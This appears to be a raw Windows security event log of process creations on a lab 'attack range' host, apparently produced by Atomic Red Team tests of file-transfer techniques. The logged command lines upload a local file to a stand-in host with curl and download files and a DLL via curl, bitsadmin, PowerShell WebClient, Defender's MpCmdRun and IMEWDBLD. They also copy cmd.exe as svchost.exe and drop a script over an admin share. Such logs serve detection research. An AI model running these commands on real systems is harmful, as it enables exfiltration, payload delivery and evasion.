02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744051
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x188c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\AtomicRedTeam\atomics\T1105\src\T1105.bat 1>NUL" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744026
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xe24
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743973
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x15e4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743920
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xde8
	New Process Name:	C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x19e8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\IME\SHARED\IMEWDBLD.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743864
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x19e8
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$imewdbled = $env:SystemRoot + \""\System32\IME\SHARED\IMEWDBLD.exe\""
& $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743204
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c8c
	New Process Name:	C:\Windows\System32\finger.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1850
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	finger  base64_filedata@localhost 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743196
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1850
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "finger base64_filedata@localhost" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743160
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x39c
	New Process Name:	C:\Windows\System32\notepad.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1628
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\AppData\Local\Temp\2\LICENSE.txt

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52743020
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1628
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742708
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f50
	New Process Name:	C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2110.6-0\MpCmdRun.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1fa0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\ADMINI~1\AppData\Local\Temp\2\Atomic-license.txt 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742696
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1fa0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742653
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa7c
	New Process Name:	C:\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x638
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\svchost.exe  /c echo T1105  

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742632
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x638
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742526
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa70
	New Process Name:	C:\Windows\System32\cscript.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x10c8
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	CScript.exe  AtomicTestT1105.js //E:JScript 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742495
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x10c8
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "pushd \\localhost\C$ & echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52742179
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1e6c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {(New-Object System.Net.WebClient).DownloadFile(\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"", \""$env:TEMP\Atomic-license.txt\"")} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52741519
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1408
	New Process Name:	C:\Windows\System32\bitsadmin.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xd90
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\ADMINI~1\AppData\Local\Temp\2\Atomic-license.txt 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52741513
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xd90
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

